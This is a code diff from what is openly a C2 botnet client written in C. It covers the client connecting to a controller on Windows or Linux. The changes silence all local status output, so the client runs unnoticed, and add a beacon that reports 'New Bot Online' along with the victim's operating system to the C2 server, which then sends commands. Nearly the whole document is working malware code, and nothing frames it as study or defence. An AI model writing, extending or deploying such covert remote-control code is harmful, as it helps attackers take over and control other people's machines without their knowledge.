@@ -36,26 +36,26 @@ int main (int argc, char *argv[]){
     if (argc == 3){
         targetIp = argv[1];
         targetPort = atoi(argv[2]); // Convert string to integer
-        printf("[*] Custom Configuration: %s:%d\n", targetIp, targetPort);
+        //printf("[*] Custom Configuration: %s:%d\n", targetIp, targetPort);
     }
     else{
-        printf("[*] Using Default Configuration: %s:%d\n", targetIp, targetPort);
+        //printf("[*] Using Default Configuration: %s:%d\n", targetIp, targetPort);
     }
 
     // 2. PLATFORM INITIALIZATION
     // Windows requires manual initialization of the Network Driver (WSA)
     #ifdef _WIN32 
         WSADATA wsa;
-        printf("[*] Machine detected: WINDOWS\n");
-        printf("[*] Initializing WinSocket...\n");
+        //printf("[*] Machine detected: WINDOWS\n");
+        //printf("[*] Initializing WinSocket...\n");
         if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
             printf("[!] Failed to initialized, ERROR: %d\n", WSAGetLastError());
             return 1;
         }
     #else
         // Linux handles sockets natively in the kernel
-        printf("[*] Machine detected: LINUX\n");
-        printf("[*] No WinSocket initialization needed. \n");
+        //printf("[*] Machine detected: LINUX\n");
+        //printf("[*] No WinSocket initialization needed. \n");
     #endif
 
     // 3. SOCKET CREATION
@@ -65,7 +65,7 @@ int main (int argc, char *argv[]){
     SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);
     
     if (soc == INVALID_SOCKET){
-        printf("[!] Socket creation failed.\n");
+        //printf("[!] Socket creation failed.\n");
         return 1;
     }
 
@@ -79,10 +79,19 @@ int main (int argc, char *argv[]){
     // 5. ESTABLISH CONNECTION
     // Returns < 0 if connection is refused or unreachable
     if (connect(soc, (struct sockaddr *)&server, sizeof(server)) < 0 ){
-        printf("[!] Connection Failed to %s:%d\n", targetIp, targetPort);
+        //1printf("[!] Connection Failed to %s:%d\n", targetIp, targetPort);
         return 1;
     }
-    printf("[+] Connected to C2! Waiting for orders...\n");
+
+    char *os_msg;
+    
+    #ifdef _WIN32
+        os_msg = "[*] New Bot Online: Target is WINDOWS\n";
+    #else
+        os_msg = "[*] New Bot Online: Target is LINUX\n";
+    #endif
+
+    send(soc, os_msg, strlen(os_msg), 0);
 
     // Buffers for data exchange
     char buffer[1024];    // Incoming command
